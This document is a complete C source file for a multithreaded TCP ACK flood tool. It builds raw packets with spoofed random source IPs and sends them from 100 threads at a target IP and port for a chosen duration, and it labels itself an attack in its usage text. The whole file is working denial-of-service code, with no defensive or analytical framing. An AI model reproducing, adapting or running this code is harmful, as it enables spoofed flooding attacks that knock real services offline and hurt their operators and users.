#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>

#define MAX_THREADS 100

unsigned short checksum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for(sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void *tcp_ack_flood(void *arg) {
    char **args = (char **)arg;
    char *target_ip = args[0];
    int target_port = atoi(args[1]);
    int duration = atoi(args[2]);
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sock < 0) {
        return NULL;
    }
    
    int one = 1;
    const int *val = &one;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));
    
    char packet[4096];
    struct iphdr *iph = (struct iphdr*)packet;
    struct tcphdr *tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
    struct sockaddr_in sin;
    
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    time_t start = time(NULL);
    unsigned long packets = 0;
    
    while(time(NULL) - start < duration) {
        memset(packet, 0, 4096);
        
        // IP Header con spoofing
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = rand(); // IP spoofing
        iph->daddr = sin.sin_addr.s_addr;
        
        // TCP Header con flag ACK
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(target_port);
        tcph->seq = rand();
        tcph->ack_seq = rand();
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 0;
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 1;  // Solo flag ACK activado
        tcph->urg = 0;
        tcph->window = htons(5840);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        // Pseudo header para checksum
        struct pseudo_tcp {
            unsigned int src_addr;
            unsigned int dst_addr;
            unsigned char zero;
            unsigned char protocol;
            unsigned short length;
        } pseudo;
        
        pseudo.src_addr = iph->saddr;
        pseudo.dst_addr = iph->daddr;
        pseudo.zero = 0;
        pseudo.protocol = IPPROTO_TCP;
        pseudo.length = htons(sizeof(struct tcphdr));
        
        char pseudo_packet[sizeof(struct pseudo_tcp) + sizeof(struct tcphdr)];
        memcpy(pseudo_packet, &pseudo, sizeof(struct pseudo_tcp));
        memcpy(pseudo_packet + sizeof(struct pseudo_tcp), tcph, sizeof(struct tcphdr));
        
        tcph->check = checksum((unsigned short*)pseudo_packet, sizeof(pseudo_packet));
        
        // Enviar paquete
        sendto(sock, packet, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin));
        packets++;
        
        if(packets % 10000 == 0) {
            printf("[TCP-ACK] Sent %lu ACK packets\n", packets);
        }
    }
    
    close(sock);
    printf("[TCP-ACK] Thread completed - %lu packets\n", packets);
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc < 4) {
        printf("TCP-ACK Flood - ACK Flag Attack\n");
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }
    
    printf("[TCP-ACK] Starting ACK Flood on %s:%d for %s seconds\n", 
           argv[1], atoi(argv[2]), argv[3]);
    
    pthread_t threads[MAX_THREADS];
    
    for(int i = 0; i < MAX_THREADS; i++) {
        pthread_create(&threads[i], NULL, tcp_ack_flood, argv + 1);
    }
    
    sleep(atoi(argv[3]));
    
    printf("[TCP-ACK] Attack completed\n");
    return 0;
}
